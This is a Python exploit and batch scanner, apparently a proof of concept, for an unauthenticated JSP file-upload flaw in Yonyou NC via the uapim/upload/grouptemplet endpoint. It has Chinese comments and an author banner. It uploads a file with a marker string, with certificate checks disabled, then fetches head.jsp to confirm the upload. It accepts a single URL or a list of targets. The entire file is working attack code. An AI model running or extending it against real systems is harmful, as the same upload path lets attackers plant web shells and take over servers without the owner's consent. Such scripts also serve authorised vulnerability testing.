import requests
import argparse
import time

# 禁用 HTTPS 警告
requests.packages.urllib3.disable_warnings()

# 核心函数 - 文件上传并验证漏洞
def exploit(target):
    target = f"{target}"

    # 文件上传的 URL
    upload_url = f"{target}/uapim/upload/grouptemplet?groupid=nc&fileType=jsp&maxSize=999"

    # 设置请求头
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryEXmnamw5gVZG9KAQ',
    }

    # 构造文件内容
    files = {
        'file': ('test.jsp', '111111111111111111111', 'application/octet-stream')
    }

    # 上传文件请求
    try:
        # 上传文件
        response = requests.post(upload_url, headers=headers, files=files, verify=False)

        if response.status_code == 200:
            print(f"{target}文件上传成功:")

            # 验证文件是否能够访问，构造文件路径
            verify_url = f"{target}/uapim/static/pages/nc/head.jsp"
            verify_response = requests.get(verify_url, headers=headers, verify=False)

            # 判断返回状态码和内容
            if verify_response.status_code == 200 and '111111111111111111111' in verify_response.text:
                print(f"上传文件地址:{verify_url} ")
            else:
                print(f"漏洞不存在: {target} -> {verify_url} 返回状态码: {verify_response.status_code}")
        else:
            print(f"文件上传失败: {target}, 状态码: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"请求超时或连接失败: {e}")


# 主函数
def main():
    # 命令行参数解析
    banner= """
     ____  ____   ___   ____  _____  ____  ____   ___   _____  _____  ____  _____   ______  
|_  _||_  _|.'   `.|_   \|_   _||_  _||_  _|.'   `.|_   _||_   _||_   \|_   _|.' ___  | 
  \ \  / / /  .-.  \ |   \ | |    \ \  / / /  .-.  \ | |    | |    |   \ | | / .'   \_| 
   \ \/ /  | |   | | | |\ \| |     \ \/ /  | |   | | | '    ' |    | |\ \| | | |        
   _|  |_  \  `-'  /_| |_\   |_    _|  |_  \  `-'  /  \ \__/ /    _| |_\   |_\ `.___.'\ 
  |______|  `.___.'|_____|\____|  |______|  `.___.'    `.__.'    |_____|\____|`.____ .' 
                                                                                by:TppxIi
    """
    print(banner)
    parse = argparse.ArgumentParser(description="YONYOUNC文件上传")
    parse.add_argument('-u', '--url', type=str, help="目标 URL")
    parse.add_argument('-f', '--file', type=str, help="包含 URL 的文件")
    args = parse.parse_args()

    url = args.url
    file = args.file
    urls = []

    # 判断是单个 URL 还是文件 URL 列表
    if url:
        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"
        urls.append(url)
    elif file:
        with open(file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line.startswith(('http://', 'https://')):
                    line = f"http://{line}"
                urls.append(line)

    # 执行漏洞检测
    if urls:
        if url:  # 如果是单个 URL 检查
            for u in urls:
                exploit(u)
        else:  # 文件 URL 批量处理
            for u in urls:
                exploit(u)

if __name__ == '__main__':
    main()
